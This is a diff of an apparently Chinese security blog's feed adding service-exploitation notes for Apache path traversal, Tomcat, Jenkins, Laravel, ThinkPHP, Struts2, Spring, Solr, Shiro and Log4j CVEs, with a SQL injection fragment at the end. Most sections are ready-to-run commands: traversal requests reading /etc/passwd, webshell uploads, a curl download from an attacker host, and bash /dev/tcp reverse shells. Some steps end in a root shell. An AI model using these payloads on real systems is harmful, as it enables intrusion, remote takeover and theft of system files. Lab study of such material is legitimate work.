+&lt;p&gt;Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;使用Kali执行下面的命令即可：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -v --path-as-is &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://目标IP:端口/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;tomcat-pass-getshell弱口令&#34;&gt;tomcat-pass-getshell：弱口令
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;先爆破弱口令&lt;/li&gt;
+&lt;li&gt;后门压缩zip改war&lt;/li&gt;
+&lt;li&gt;上传war访问链接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;打开网站，点击&lt;strong&gt;manageapp&lt;/strong&gt;，用户名密码都是tomcat或者admin&lt;/p&gt;
+&lt;p&gt;发现&lt;strong&gt;WAR file to deploy&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;哥斯拉生成jsp木马(有效载荷是JavaDynamicPayload)，压缩为zip，改名为&lt;code&gt;a1.war&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;之后发现网站有一个/a1&lt;/p&gt;
+&lt;p&gt;地址为&lt;code&gt;http://目标IP:端口/a1/a1.jsp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;哥斯拉（ONE-FOX集成工具箱）连接即可（记得选相同的有效载荷）&lt;/p&gt;
+&lt;h3 id=&#34;tomcatcve-2017-12615文件上传&#34;&gt;tomcat：CVE-2017-12615（文件上传）
+&lt;/h3&gt;&lt;p&gt;burp直接首页抓包，改为PUT，内容为从文件粘贴jsp木马的代码&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;PUT /x.jsp/ &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;PUT /xx.jsp%20&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;PUT /xxx.jsp::$DATA&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;之后木马就在&lt;code&gt;http://目标IP:端口/xxx.jsp&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;jenkinscve-2018-1000861&#34;&gt;jenkins：CVE-2018-1000861
+&lt;/h3&gt;&lt;p&gt;在&lt;code&gt;服务攻防\jenkins\CVE-2018-1000861&lt;/code&gt;创建&lt;code&gt;shell.txt&lt;/code&gt;内容为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bash -i &amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/攻击IP/5566 0&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;随后在同目录下执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -m http.server &lt;span class=&#34;m&#34;&gt;8888&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 exp.py http://目标IP:端口/ &lt;span class=&#34;s2&#34;&gt;&amp;#34;curl -o /tmp/1.sh http://攻击IP:8888/shell.txt&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;此时目标的/tmp/1.sh有了&lt;/p&gt;
+&lt;p&gt;攻击端使用nc监听&lt;code&gt;nc -lvvp 5566&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;接着在刚才的目录执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 exp.py http://192.168.142.129:62408/ &lt;span class=&#34;s2&#34;&gt;&amp;#34;bash /tmp/1.sh&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;laravelcve-2021-3129rce&#34;&gt;laravel：CVE-2021-3129（RCE）
+&lt;/h3&gt;&lt;p&gt;要求：Laravel &amp;lt;= 8.4.2&lt;/p&gt;
+&lt;p&gt;进入&lt;code&gt;服务攻防\Laravel\CVE-2021-3129-main&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;执行：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python exp.py http://目标IP:端口
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;thinkphp&#34;&gt;thinkphp
+&lt;/h3&gt;&lt;p&gt;#Thinkphp-3.X RCE-6.X RCE&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;综合工具：武器库-Thinkphp专检（3-6版本）&lt;/p&gt;
+&lt;h4 id=&#34;cve-2018-1002015&#34;&gt;CVE-2018-1002015
+&lt;/h4&gt;&lt;p&gt;one-fox的thinkphp综合利用工具，地址写进去检测，可以检测出漏洞&lt;/p&gt;
+&lt;p&gt;选择thinkphp5.0 rce，命令写whoami即可&lt;/p&gt;
+&lt;h4 id=&#34;cnvd-2018-24942&#34;&gt;CNVD-2018-24942
+&lt;/h4&gt;&lt;p&gt;one-fox的thinkphp综合利用工具，地址写进去检测，可以检测出漏洞&lt;/p&gt;
+&lt;h3 id=&#34;strutss2&#34;&gt;struts（s2）
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Apache Struts2框架是一个使用JavaEE网络应用程序的Web框架。&lt;/p&gt;
+&lt;p&gt;可能存在OGNL表达注入扩展，从而造成远程代码执行，风险极大。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;fofa搜索&lt;code&gt;app=&amp;quot;struts2&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;struts2cve-2020-17530-代码执行-&#34;&gt;struts2：CVE-2020-17530（ 代码执行 ）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;要求：&lt;/strong&gt; Apache Struts 2.0.0 - 2.5.25&lt;/p&gt;
+&lt;p&gt;找到&lt;code&gt;服务攻防\struts2\s2-062-main&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;当前目录执行：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python .&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;2-062.py --url http://目标IP:端口/ --cmd id
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;会出现信息&lt;/p&gt;
+&lt;h3 id=&#34;spring目录遍历&#34;&gt;Spring（目录遍历）
+&lt;/h3&gt;&lt;p&gt;0.2.13之前版本存在路径遍历漏洞，攻击者可通过该缺陷读取系统任意文件。&lt;/p&gt;
+&lt;p&gt;参考文献：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_43165012/article/details/121152482&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/weixin_43165012/article/details/121152482&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;如果是Linux服务器&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://目标IP:端口/manage/log/view?filename=etc/passwd&amp;amp;base=../../../../../../&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;如果是windows服务器&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://目标IP:端口/manage/log/view?filename=/windows/win.ini&amp;amp;base=../../../../../../../&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;退格是为了确保退到根目录&lt;/p&gt;
+&lt;h3 id=&#34;solrcve-2019-17558命令执行&#34;&gt;Solr：CVE-2019-17558（命令执行）
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;主要基于HTTP和Apache Lucene实现的全文搜索服务器。&lt;/p&gt;
+&lt;p&gt;历史漏洞：&lt;a class=&#34;link&#34; href=&#34;https://avd.aliyun.com/search?q=Solr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://avd.aliyun.com/search?q=Solr&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;黑盒特征：图标及端口8393&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;fofa搜&lt;code&gt;port=&amp;quot;8983&amp;quot; &amp;amp;&amp;amp; title=&amp;quot;Solr Admin&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;要求：&lt;/strong&gt; Apache Solr 5.0.0版本至8.3.1&lt;/p&gt;
+&lt;p&gt;找到&lt;code&gt;服务攻防\solr\solr_rce-master&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 solr_rce.py http://目标IP:端口 id
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 可以发现内容&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 solr_rce.py http://目标IP:端口 &lt;span class=&#34;s2&#34;&gt;&amp;#34;cat /etc/passwd&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;solrcve-2021-27905文件读取ssrf&#34;&gt;Solr：CVE-2021-27905（文件读取&amp;amp;SSRF）
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;全版本官方拒绝修复漏洞&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;获取数据库名&#34;&gt;获取数据库名
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://目标IP:端口/solr/admin/cores?indexInfo&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;false&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;wt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;json
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;可以获取status的name为demo&lt;/p&gt;
+&lt;h4 id=&#34;访问触发&#34;&gt;访问触发
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -i -s -k -X &lt;span class=&#34;s1&#34;&gt;$&amp;#39;POST&amp;#39;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Content-Type: application/json&amp;#39;&lt;/span&gt; --data-binary &lt;span class=&#34;s1&#34;&gt;$&amp;#39;{\&amp;#34;set-property\&amp;#34;:{\&amp;#34;requestDispatcher.requestParsers.enableRemoteStreaming\&amp;#34;:true}}&amp;#39;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s1&#34;&gt;$&amp;#39;http://目标IP:端口/solr/demo/config&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;任意文件读取&#34;&gt;任意文件读取
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -i -s -k &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://目标IP:端口/solr/demo/debug/dump?param=ContentStreams&amp;amp;stream.url=file:///etc/passwd&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;shirocve-2016-4437命令执行&#34;&gt;shiro：CVE-2016-4437(命令执行)
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;ava安全框架，能够用于身份验证、授权、加密和会话管理。&lt;/p&gt;
+&lt;p&gt;历史漏洞：&lt;a class=&#34;link&#34; href=&#34;https://avd.aliyun.com/search?q=Shiro&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://avd.aliyun.com/search?q=Shiro&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;黑盒特征：数据包cookie里面rememberMe&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;利用one-fox工具箱中的shiro-attack工具。&lt;/p&gt;
+&lt;p&gt;目标地址写&lt;code&gt;http://目标IP:端口/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;请求头Abc: 123，post数据a=123&lt;/p&gt;
+&lt;p&gt;爆破密钥kPH+bIxk5D2deZiIxcaaaA==&lt;/p&gt;
+&lt;p&gt;爆破利用链和回显，发现common2和AllEcho&lt;/p&gt;
+&lt;h3 id=&#34;log4jcve-2021-44228远程命令执行&#34;&gt;log4j：CVE-2021-44228（远程命令执行）
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Apache的一个开源项目，是一个基于Java的日志记录框架。&lt;/p&gt;
+&lt;p&gt;历史漏洞：&lt;a class=&#34;link&#34; href=&#34;https://avd.aliyun.com/search?q=Log4j&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://avd.aliyun.com/search?q=Log4j&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;黑盒特征：盲打 会问蓝队攻击特征（关键词&lt;code&gt;${jndi:rmi:///osutj8}&lt;/code&gt;）&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;要求：&lt;/strong&gt; Apache Log4j2 2.0 - 2.15.0-rc1&lt;/p&gt;
+&lt;p&gt;在dnslog平台获取一个域名，制作payload&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;${jndi:ldap://域名}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;将上面的payloadURL编码后拼接在&lt;code&gt;http://目标IP:端口/hello?payload=&lt;/code&gt;之后并访问&lt;/p&gt;
+&lt;p&gt;发现dnslog有响应，说明漏洞存在&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;构造第二个payload&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bash -c &amp;#39;exec bash -i &amp;amp;&amp;gt;/dev/tcp/攻击IP/5566 &amp;lt;&amp;amp;1&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;使用base64编码后拼接在下面&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &amp;#34;bash -c {echo,payload放在这里}|{base64,-d}|{bash,-i}&amp;#34; -A 攻击IP
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;nc监听&lt;code&gt;nc -lvvp 5566&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;进入&lt;code&gt;服务攻防\log4j&lt;/code&gt;在当前目录执行上面拼接好的命令&lt;/p&gt;
+&lt;p&gt;在命令行中返回的内容里选择tomcat 8+的地址作为payload，例如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rmi://192.168.80.134:1099/u8ebi9	//这个是地址
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;拼接到下面的地址中&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://192.168.80.151:42927/hello?payload=${jndi:插在这}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;同样把payload=后面的内容进行URL编码后直接访问，发现nc中有目标的root身份终端。&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -3477,6 +3938,24 @@ document.addEventListener(&#34;pjax:complete&#34;, function () {
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?id&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select load_file(concat(&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,(select database()),&amp;#39;&lt;/span&gt;.域名&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;a&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt; --+
